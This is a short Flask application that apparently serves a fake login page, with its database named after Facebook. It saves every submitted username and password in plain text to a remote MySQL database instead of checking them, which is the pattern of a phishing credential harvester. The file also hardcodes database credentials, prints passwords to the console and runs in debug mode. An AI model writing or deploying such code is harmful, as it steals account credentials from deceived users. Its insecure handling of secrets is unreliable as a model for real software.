from flask import Flask, request, redirect, render_template
from flask_sqlalchemy import SQLAlchemy

app = Flask(__name__)

# Update the database URI with the provided credentials
db_uri = 'mysql+pymysql://facebook_blindcity:59257e84d141d92bd5434c4f9c800c6ea897ef0f@cxr.h.filess.io:3307/facebook_blindcity'
app.config['SQLALCHEMY_DATABASE_URI'] = db_uri
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False

db = SQLAlchemy(app)

class User(db.Model):
    __tablename__ = 'users'  # Specify the table name
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(80), unique=True, nullable=False)
    password = db.Column(db.String(120), nullable=False)

@app.route('/')
def index():
    return render_template('login.html')

@app.route('/login', methods=['POST'])
def login():
    try:
        username = request.form['username']
        password = request.form['password']
        
        # Debugging: Print username and password to ensure they are captured correctly
        print(f"Username: {username}, Password: {password}")

        # Create a new user instance with the plain text password
        new_user = User(username=username, password=password)
        
        # Add the user to the database session and commit
        db.session.add(new_user)
        db.session.commit()
        
        # Optionally, you can redirect to another page after successful save
        return redirect('/')

    except Exception as e:
        # Log the exception
        print(f"An error occurred: {str(e)}")
        return f"An error occurred while processing your request: {str(e)}", 500

if __name__ == '__main__':
    app.run(debug=True)
